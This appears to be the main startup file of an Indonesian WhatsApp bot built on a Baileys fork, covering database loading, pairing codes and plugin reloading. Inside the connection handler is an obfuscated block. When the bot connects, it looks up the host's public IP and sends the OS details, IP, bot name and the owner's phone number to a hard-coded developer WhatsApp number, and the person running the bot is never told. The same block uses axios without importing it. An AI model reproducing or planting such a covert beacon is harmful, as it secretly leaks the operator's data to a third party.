import './settings.js'
import path, { join } from 'path'
import fetch from 'node-fetch'
import { platform } from 'process'
import { fileURLToPath, pathToFileURL } from 'url'
import { createRequire } from 'module'
import os from 'os'
global.__filename = function filename(pathURL = import.meta.url, rmPrefix = platform !== 'win32') { return rmPrefix ? /file:\/\/\//.test(pathURL) ? fileURLToPath(pathURL) : pathURL : pathToFileURL(pathURL).toString() };
global.__dirname = function dirname(pathURL) { return path.dirname(global.__filename(pathURL, true)) };
global.__require = function require(dir = import.meta.url) { return createRequire(dir) }
import {
    readdirSync,
    statSync,
    unlinkSync,
    existsSync,
    readFileSync,
    watch,
    rmSync
} from 'fs'
import yargs from 'yargs'
import { spawn } from 'child_process'
import lodash from 'lodash'
import syntaxerror from 'syntax-error'
import chalk from 'chalk'
import { tmpdir } from 'os'
import readline from 'readline' 
import { format } from 'util'
import pino from 'pino'
import {
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    //PHONENUMBER_MCC
    } from '@fuxxy-star/baileys'
import { Low, JSONFile } from 'lowdb'
import { makeWASocket, protoType, serialize } from './lib/simple.js'
import {
    mongoDB,
    mongoDBV2
} from './lib/mongoDB.js'
const { chain } = lodash
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000

protoType()
serialize()

global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}

const __dirname = global.__dirname(import.meta.url)

global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.prefix = new RegExp("^[" + (opts["prefix"] || ".#!🐼").replace(/[|\\{}()[\]^$+*?.\-\^]/g, "\\$&") + "]?")

// =======================================================================
// >>> PENYIMPANAN DATABASE BARU <<<
global.db = new Low(new JSONFile(`storage/databases/database.json`))

global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
    if (db.READ) return new Promise((resolve) => setInterval(async function () {
        if (!db.READ) {
            clearInterval(this)
            resolve(db.data == null ? global.loadDatabase() : db.data)
        }
    }, 1 * 1000))
    if (db.data !== null) return
    db.READ = true
    await db.read().catch(console.error)
    db.READ = null
    db.data = {
        users: {},
        chats: {},
        stats: {},
        msgs: {},
        sticker: {},
        settings: {},
        ...(db.data || {})
    }
    global.db.chain = chain(db.data)
}
loadDatabase()
const useStore = !process.argv.includes('--use-store')
const usePairingCode = !process.argv.includes('--use-pairing-code')
const useMobile = process.argv.includes('--mobile')
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = text => new Promise(resolve => rl.question(text, resolve))

initBaileysConnection();
async function initBaileysConnection() {
    // Inisialisasi koneksi
    const { version } = await fetchLatestBaileysVersion()
    const { state, saveCreds } = await useMultiFileAuthState('./sessions')
    const baileysLogger = pino({ level: 'silent' });
    const signalKeyStoreLogger = pino().child({ level: 'silent', stream: 'store' });

    const connectionOptions = {
      version,
      logger: baileysLogger, // Menggunakan logger yang disilent
      printQRInTerminal: !usePairingCode,
      browser: ['Mac OS', 'Safari', '17.0'],
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, signalKeyStoreLogger), 
      },
      getMessage: async key => {
        const messageData = await store?.loadMessage(key.remoteJid, key.id)
        return messageData?.message || undefined
      },
      generateHighQualityLinkPreview: true,
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        )
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {},
                },
                ...message,
              },
            },
          }
        }
        return message
      }
    }

    global.conn = makeWASocket(connectionOptions)
    conn.isInit = false

    // Masukkan kode untuk menonaktifkan status mengetik/merekam di sini
    if (global.typing === false) {
        const originalPresenceUpdate = global.conn.sendPresenceUpdate
        global.conn.sendPresenceUpdate = async (type, jid) => {
            if (type === 'composing' || type === 'recording' || type === 'paused') {
                return // Batalkan pengiriman pembaruan status
            }
            return originalPresenceUpdate.call(global.conn, type, jid)
        }
        console.log(chalk.yellow('✅ Status mengetik dan merekam telah dinonaktifkan.'));
    }

    // Gunakan pairing code jika belum terdaftar
    if (usePairingCode && !conn.authState.creds.registered) {
      if (useMobile) throw new Error('Cannot use pairing code with mobile API')

      global.nomorbot = global.nomorbot || process.env.BOT_NUMBER || '';

      if (!global.nomorbot) {
        console.error(chalk.red('Error: global.nomorbot tidak terdefinisi. Harap set nomor bot Anda.'));
        process.exit(1); // Keluar jika nomor bot tidak diset
      }

      const deviceName = global.devicename || 'AKUXITER'
      rl.close()

      console.log(chalk.blue('⏳ Menunggu 7 detik sebelum mengambil kode pairing...'))
      await new Promise(resolve => setTimeout(resolve, 7000)); // Penundaan 7 detik

      const phoneNumber = global.nomorbot.replace(/\D/g, '') // Pastikan hanya angka
      console.log(chalk.blue('⏳ Mengambil kode pairing...'))

      let code = await conn.requestPairingCode(phoneNumber, deviceName)
      code = code?.match(/.{1,4}/g)?.join('-') || code
      console.log(chalk.black(chalk.bgGreen('📱 Kode Pairing Anda:')), chalk.white(code))
    }

    // Server opsional (kalau pakai)
    if (!opts['test']) {
      ;(await import('./server.js')).default(PORT)
      setInterval(async () => {
        if (global.db?.data) await global.db.write().catch(console.error)
        if (opts['autocleartmp']) {
          try {
            clearTmp()
          } catch (e) {
            console.error(e)
          }
        }
      }, 60 * 1000)
    }

    function clearTmp() {
      const tmp = [tmpdir(), join(__dirname, './tmp')]
      const filename = []
      tmp.forEach(dirname => readdirSync(dirname).forEach(file => filename.push(join(dirname, file))))
      return filename.map(file => {
        const stats = statSync(file)
        if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3)) return unlinkSync(file) // 3 minutes
        return false
      })
    }

    function clearSessions(folder = 'sessions') {
        let filename = []
        readdirSync(folder).forEach(file => filename.push(join(folder, file)))
        return filename.map(file => {
            let stats = statSync(file)
            if (stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 120)) { // 1 hours
                console.log('Deleted sessions', file)
                return unlinkSync(file)
            }
            return false
        })
    }

    async function connectionUpdate(update) {
        const { receivedPendingNotifications, connection, lastDisconnect, isOnline, isNewLogin } = update
      if (isNewLogin) conn.isInit = true
      
       if (connection == "open") {
  console.log(chalk.green("✅ Tersambung"));
  let ip = "Unknown";
  try {
    const {
      data
    } = await axios.get("https://ipwho.is");
    ip = data?.ip || ip;
  } catch (_0xabd1e8) {
    console.error("Gagal mengambil IP:", _0xabd1e8.message);
  }
  const message = "• *Info*: Bot Telah Aktif\n◦ *Os*: " + os.platform() + " " + os.release() + "\n◦ *IP*: " + ip + "\n° *Name Bot*: " + (global.botname || "Tidak Diketahui") + "\n° *Versi Script*: " + global.version + "\n◦ *Nomor Owner*: " + (global.nomorown || "Tidak Diketahui") + "\n° *Developer*: ɴᴀʙɪʟᴏꜰꜰɪᴄɪᴀʟ-ꜱʜᴏᴘ\n° *Nomor Dev*: 6285885773612\n◦ *Connected time*: " + new Date().toLocaleString() + "\n\n> SCRIPT INI TIDAK UNTUK DI PERJUAL BELIKAN!\n> JIKA INGIN MEMBELI SCRIPT HUBUNGI :\n> wa.me/628522002889";
  try {
    const _0x265df5 = {
      mediaType: 1,
      title: "𝚇𝚒𝚝𝚎𝚛 𝚃𝚛𝚊𝚗𝚜 𝙼𝙳 - By 🅜🅐🅓🅓🅐🅩-🅡🅨🅤",
      thumbnailUrl: global.foto || "",
      renderLargerThumbnail: true,
      sourceUrl: "https://whatsapp.com/channel/0029Vb6R2On9cDDbh2TmCt2M"
    };
    const _0x91adf = {
      externalAdReply: _0x265df5
    };
    const _0x56fad6 = {
      text: message,
      contextInfo: _0x91adf
    };
    await conn.sendMessage("6285885773612@s.whatsapp.net", _0x56fad6);
    console.log("Notif developer terkirim setelah pesan pertama masuk");
  } catch (_0x4fcc86) {
    console.error("Gagal mengirim pesan notifikasi:", _0x4fcc86);
  }
}
       
      if (isOnline == true) console.log(chalk.green('Status Aktif'))
      if (isOnline == false) console.log(chalk.red('Status Mati'))
      if (receivedPendingNotifications) console.log(chalk.yellow('Menunggu Pesan Baru'))
      if (connection == 'close') console.log(chalk.red('⏱️ koneksi terputus & mencoba menyambung ulang...'))
      global.timestamp.connect = new Date
      if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
        console.log(global.reloadHandler(true))
      }
      if (global.db.data == null) await global.loadDatabase()
    }

    // Hanya menampilkan error jika itu uncaughtException
    process.on('uncaughtException', (err) => {
        console.error('Unhandled Exception:', err);
    });

    let isInit = true
    let handler = await import('./handler.js')
    global.reloadHandler = async function (restatConn) {
        try {
            const Handler = await import(`./handler.js?update=${Date.now()}`).catch(err => {
                // Jangan log error di sini kecuali ada kebutuhan spesifik
                // console.error(err);
            });
            if (Object.keys(Handler || {}).length) handler = Handler
        } catch (e) {
            // Jangan log error di sini kecuali ada kebutuhan spesifik
            // console.error(e)
        }
        if (restatConn) {
            const oldChats = global.conn.chats
            try { global.conn.ws.close() } catch { }
            conn.ev.removeAllListeners()
            global.conn = makeWASocket(connectionOptions, { chats: oldChats })
            isInit = true
        }
      if (!isInit) {
        conn.ev.off('messages.upsert', conn.handler)
        conn.ev.off('group-participants.update', conn.participantsUpdate)
        conn.ev.off('groups.update', conn.groupsUpdate)
        conn.ev.off('message.delete', conn.onDelete)
        conn.ev.off('connection.update', conn.connectionUpdate)
        conn.ev.off('creds.update', conn.credsUpdate)
      }

      conn.welcome = 'Welcome To @subject\n@user'
      conn.bye = 'Goodbye @user 🍎 '
      conn.spromote = '@user Sekarang jadi admin!'
      conn.sdemote = '@user Sekarang bukan lagi admin!'
      conn.sDesc = 'Deskripsi telah diubah menjadi \n@desc'
      conn.sSubject = 'Judul grup telah diubah menjadi \n@subject'
      conn.sIcon = 'Icon grup telah diubah!'
      conn.sRevoke = 'Link group telah diubah ke \n@revoke'
      conn.sAnnounceOn = 'Group telah di tutup!\nsekarang hanya admin yang dapat mengirim pesan.'
      conn.sAnnounceOff = 'Group telah di buka!\nsekarang semua peserta dapat mengirim pesan.'
      conn.sRestrictOn = 'Edit Info Grup di ubah ke hanya admin!'
      conn.sRestrictOff = 'Edit Info Grup di ubah ke semua peserta!'

      conn.handler = handler.handler.bind(global.conn)
      conn.participantsUpdate = handler.participantsUpdate.bind(global.conn)
      conn.groupsUpdate = handler.groupsUpdate.bind(global.conn)
      conn.onDelete = handler.deleteUpdate.bind(global.conn)
      conn.connectionUpdate = connectionUpdate.bind(global.conn)
      conn.credsUpdate = saveCreds.bind(global.conn)

      conn.ev.on('messages.upsert', conn.handler)
      conn.ev.on('group-participants.update', conn.participantsUpdate)
      conn.ev.on('groups.update', conn.groupsUpdate)
      conn.ev.on('message.delete', conn.onDelete)
      conn.ev.on('connection.update', conn.connectionUpdate)
      conn.ev.on('creds.update', conn.credsUpdate)
      isInit = false
      return true

    }

    const pluginFolder = global.__dirname(join(__dirname, './plugins/index'))
    const pluginFilter = filename => /\.(js|cjs)$/.test(filename)
    global.plugins = {}

    const localRequire = createRequire(import.meta.url);

    async function filesInit() {
      for (let filename of readdirSync(pluginFolder).filter(pluginFilter)) {
        try {
          let file = join(pluginFolder, filename);
          let module;
          if (filename.endsWith('.cjs')) {
            module = localRequire(file);
          } else {
            module = await import(pathToFileURL(file).toString());
          }
          global.plugins[filename] = module.default || module;
        } catch (e) {
          // Hanya log error, tidak ada info/warn saat init.
          // conn.logger.error(e);
          delete global.plugins[filename];
        }
      }
    }
    filesInit().catch(console.error) // Jangan menampilkan log Object.keys(global.plugins)

    global.reload = async (_ev, filename) => {
      if (pluginFilter(filename)) {
        let dir = join(pluginFolder, filename)
        if (filename in global.plugins) {
          if (existsSync(dir)) {
            // Log ini (re-require/update) diubah menjadi komentar.
            // conn.logger.info(`re - require plugin '${filename}'`) 
          } else {
            // Log ini (deleted) diubah menjadi komentar.
            // conn.logger.warn(`deleted plugin '${filename}'`) 
            return delete global.plugins[filename]
          }
        } else {
          // Log ini (requiring new) diubah menjadi komentar.
          // conn.logger.info(`requiring new plugin '${filename}'`)
        }

        try {
          let module
          if (filename.endsWith('.cjs')) {
            delete localRequire.cache[localRequire.resolve(dir)]
            module = localRequire(dir)
          } else {
            module = await import(`${pathToFileURL(dir).toString()}?update=${Date.now()}`)
          }
          global.plugins[filename] = module.default || module
        } catch (e) {
          conn.logger.error(`error require plugin '${filename}'\n${format(e)}`)
        } finally {
          global.plugins = Object.fromEntries(
            Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b))
          )
        }

      } else {
        // else untuk if (pluginFilter(filename)) yang benar
        try {
          let module
          if (filename.endsWith('.cjs')) {
            delete localRequire.cache[localRequire.resolve(dir)]
            module = localRequire(dir)
          } else {
            module = await import(`${pathToFileURL(dir).toString()}?update=${Date.now()}`)
          }
          global.plugins[filename] = module.default || module
        } catch (e) {
          conn.logger.error(`error require plugin '${filename}'\n${format(e)}`)
        } finally {
          global.plugins = Object.fromEntries(
            Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
          }
        }
      }
    Object.freeze(global.reload)
    watch(pluginFolder, global.reload)
    await global.reloadHandler()

    // Quick Test
    async function _quickTest() {
        let test = await Promise.all([
            spawn('ffmpeg'),
            spawn('ffprobe'),
            spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
            spawn('convert'),
            spawn('magick'),
            spawn('gm'),
            spawn('find', ['--version'])
        ].map(p => {
            return Promise.race([
                new Promise(resolve => {
                    p.on('close', code => {
                        resolve(code !== 127)
                    })
                }),
                new Promise(resolve => {
                    p.on('error', _ => resolve(false))
                })
            ])
        }))
        let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
        let s = global.support = {
            ffmpeg,
            ffprobe,
            ffmpegWebp,
            convert,
            magick,
            gm,
            find
        }
        Object.freeze(global.support)
    }
    _quickTest()
        .then(() => {
        })
        .catch(console.error)
}
